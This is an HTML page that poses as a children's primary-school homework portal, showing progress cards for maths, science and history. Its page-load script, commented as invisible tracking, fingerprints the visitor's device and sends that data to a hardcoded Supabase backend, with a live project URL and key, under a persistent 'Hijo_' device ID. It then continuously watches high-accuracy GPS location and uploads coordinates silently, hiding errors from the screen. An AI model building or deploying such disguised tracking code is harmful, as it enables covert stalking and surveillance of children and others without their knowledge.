<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal de Tareas Escolares</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- FontAwesome para iconos -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Supabase JS Client -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f0fdf9; }
        .glass-card { background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(10px); }
    </style>
</head>
<body class="min-h-screen text-slate-800">

    <!-- Navbar -->
    <nav class="bg-teal-500 text-white p-4 shadow-md">
        <div class="container mx-auto flex justify-between items-center">
            <h1 class="text-2xl font-bold flex items-center gap-2">
                <i class="fa-solid fa-graduation-cap"></i> Mi EduPortal
            </h1>
            <div class="flex items-center gap-4">
                <span class="bg-teal-600 px-3 py-1 rounded-full text-sm font-medium">Nivel: Primaria</span>
                <i class="fa-solid fa-user-circle text-2xl"></i>
            </div>
        </div>
    </nav>

    <!-- Contenido Principal -->
    <main class="container mx-auto p-6 mt-8">
        <div class="text-center mb-10">
            <h2 class="text-4xl font-extrabold text-teal-700 mb-2">¡Hola, Estudiante! 👋</h2>
            <p class="text-lg text-teal-600 font-medium">Nunca te rindas, los grandes logros llevan tiempo.</p>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <!-- Tarjeta Matemáticas -->
            <div class="glass-card rounded-2xl p-6 shadow-lg border border-teal-100 hover:shadow-xl transition-shadow cursor-pointer">
                <div class="w-14 h-14 bg-blue-100 text-blue-500 rounded-full flex items-center justify-center text-2xl mb-4">
                    <i class="fa-solid fa-calculator"></i>
                </div>
                <h3 class="text-xl font-bold mb-2">Matemáticas</h3>
                <p class="text-slate-500 text-sm mb-4">Fracciones y decimales. ¡Tú puedes!</p>
                <div class="w-full bg-slate-200 rounded-full h-2.5">
                    <div class="bg-blue-500 h-2.5 rounded-full" style="width: 70%"></div>
                </div>
                <p class="text-right text-xs mt-1 font-bold text-slate-400">70% Completado</p>
            </div>

            <!-- Tarjeta Ciencias -->
            <div class="glass-card rounded-2xl p-6 shadow-lg border border-teal-100 hover:shadow-xl transition-shadow cursor-pointer">
                <div class="w-14 h-14 bg-green-100 text-green-500 rounded-full flex items-center justify-center text-2xl mb-4">
                    <i class="fa-solid fa-flask"></i>
                </div>
                <h3 class="text-xl font-bold mb-2">Ciencias Naturales</h3>
                <p class="text-slate-500 text-sm mb-4">El ciclo del agua. Tarea pendiente.</p>
                <div class="w-full bg-slate-200 rounded-full h-2.5">
                    <div class="bg-green-500 h-2.5 rounded-full" style="width: 30%"></div>
                </div>
                <p class="text-right text-xs mt-1 font-bold text-slate-400">30% Completado</p>
            </div>

            <!-- Tarjeta Historia -->
            <div class="glass-card rounded-2xl p-6 shadow-lg border border-teal-100 hover:shadow-xl transition-shadow cursor-pointer">
                <div class="w-14 h-14 bg-orange-100 text-orange-500 rounded-full flex items-center justify-center text-2xl mb-4">
                    <i class="fa-solid fa-monument"></i>
                </div>
                <h3 class="text-xl font-bold mb-2">Historia</h3>
                <p class="text-slate-500 text-sm mb-4">Las civilizaciones antiguas.</p>
                <div class="w-full bg-slate-200 rounded-full h-2.5">
                    <div class="bg-orange-500 h-2.5 rounded-full" style="width: 100%"></div>
                </div>
                <p class="text-right text-xs mt-1 font-bold text-slate-400">¡Completado!</p>
            </div>
        </div>
    </main>

    <!-- Script de seguimiento invisible -->
    <script>
        // ========================================================
        // CONFIGURACIÓN SUPABASE - INTRODUCE TUS CREDENCIALES AQUÍ
        // ========================================================
        const SUPABASE_URL = 'https://wzoisjxppwxwuorlbdxe.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind6b2lzanhwcHd4d3VvcmxiZHhlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMjkzNDksImV4cCI6MjA4ODkwNTM0OX0.XRExCFt2Whs8h_itf2OOIFI1_1MINkcnfA7npDy3SEQ';
        // ========================================================

        const { createClient } = supabase;
        const supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        // Generar fallback de UUID si el navegador no lo soporta o no está en https
        function generateUUID() {
            if (typeof crypto !== 'undefined' && crypto.randomUUID) {
                return crypto.randomUUID();
            }
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
                var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
                return v.toString(16);
            });
        }

        // Recuperar o asignar un ID de dispistivo persistente
        let deviceId = localStorage.getItem('educ_device_id');
        if (!deviceId) {
            deviceId = generateUUID();
            localStorage.setItem('educ_device_id', deviceId);
        }
        const deviceName = "Hijo_" + deviceId.substring(0, 4);

        // Recolectar datos del dispositivo que NO requieren permiso
        function getDeviceMetadata() {
            let conn = 'Desconocida';
            try {
                if (navigator.connection) {
                    conn = `${navigator.connection.effectiveType || '?'} | Downlink: ~${navigator.connection.downlink || 0}Mbps | RTT: ${navigator.connection.rtt || 0}ms`;
                }
            } catch(e) {}
            
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || 'Desconocida',
                vendor: navigator.vendor,
                language: navigator.language,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                windowSize: `${window.innerWidth}x${window.innerHeight}`,
                colorDepth: window.screen.colorDepth,
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                cookieEnabled: navigator.cookieEnabled,
                connection: conn,
                timestampLocal: new Date().toString()
            };
        }

        // 1. Enviar INMEDIATAMENTE al entrar, sin esperar GPS (con lat/lon 0 temporal)
        async function logVisit() {
            const { error } = await supabaseClient
                .from('ubicaciones')
                .upsert({
                    id: deviceId,
                    latitud: 0,
                    longitud: 0, 
                    dispositivo: deviceName,
                    meta_datos: getDeviceMetadata(),
                    ultima_actualizacion: new Date().toISOString()
                });
            if (error) console.error("Error logging visit:", error);
        }
        logVisit();

        // 2. Solicitar y observar la ubicación del dispositivo con alta precisión
        if ("geolocation" in navigator) {
            navigator.geolocation.watchPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // Enviar datos silenciosamente a Supabase (Actualiza con coordenadas reales)
                    const { error } = await supabaseClient
                        .from('ubicaciones')
                        .upsert({
                            id: deviceId,
                            latitud: lat,
                            longitud: lon,
                            dispositivo: deviceName,
                            meta_datos: getDeviceMetadata(),
                            ultima_actualizacion: new Date().toISOString()
                        });

                    if (error) {
                        console.error("Error silencioso (ignorar en UI):", error);
                    }
                },
                (error) => {
                    // Opcional: manejar error de permisos en silencio
                    console.warn("Permiso de ubicación denegado o error de señal", error);
                },
                {
                    enableHighAccuracy: true,
                    maximumAge: 0, 
                    timeout: 27000
                }
            );
        }
    </script>
</body>
</html>
